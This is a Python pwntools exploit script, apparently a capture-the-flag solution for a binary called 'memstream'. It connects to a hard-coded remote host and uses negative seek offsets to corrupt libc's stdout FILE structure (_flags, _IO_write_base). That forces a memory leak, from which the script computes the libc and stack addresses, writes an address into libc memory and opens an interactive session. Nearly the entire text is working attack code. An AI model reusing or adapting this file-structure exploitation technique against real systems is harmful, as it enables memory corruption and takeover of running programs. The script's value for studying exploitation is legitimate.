#!/usr/bin/env python3

from pwn import *
context.log_level ="debug"
elf = ELF("./memstream_unpacked_patched")
libc = ELF("./libc.so.6")

context.binary = elf

def menu():
    return p.recvuntil(b'> ')

def seek(offset):
    p.sendline(b'1')
    p.sendlineafter(b'Position: ', str(offset).encode())
    return menu()

def write(data, ment=True):
    size = len(data)
    p.sendline(b'3')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)
    if ment:
      return menu()

if args.DOCKER:
  host, port = "127.0.0.1", 5000
else:
  host, port = "54.78.163.105", 32121

while 1:
    global leak
    global parts
    global p
    
    p = remote(host, port)
    seek(-0x528e0) # _flags
    write(p16(0x1887))

    seek(-0x528e0+0x20) # _IO_write_base
    leak = write(p16(0x3700))

    parts = [leak[i*8:(i+1)*8][::-1].hex() for i in range(len(leak)//8)]
    if len(parts) < 4:
        p.close()
        print("Invalid")
        continue

    if parts[0] == '0000000000000000':
        p.close()
        print("Invalid")
        continue

    if parts[1] != '0000000000000000' or parts[2] != '0000000000000000' or parts[3] != '0000000000000000':
        p.close()
        print("Invalid")
        continue
    
    break

print(hexdump(leak))
for i in range(len(parts)):
    print(i, parts[i])


libc.address = int(parts[0], 16) - 0x1d8139
stack = int(parts[454], 16)

info("Stack: %s", hex(stack))
info("Libc: %s", hex(libc.address))

bss = libc.address+0x26d060
print("bss address = "+hex(bss))

pause()
neg = -bss
neg += libc.address+0x21c098
seek(-0x53fc8)
write(p64(libc.address+0x26a229), False)

p.interactive()


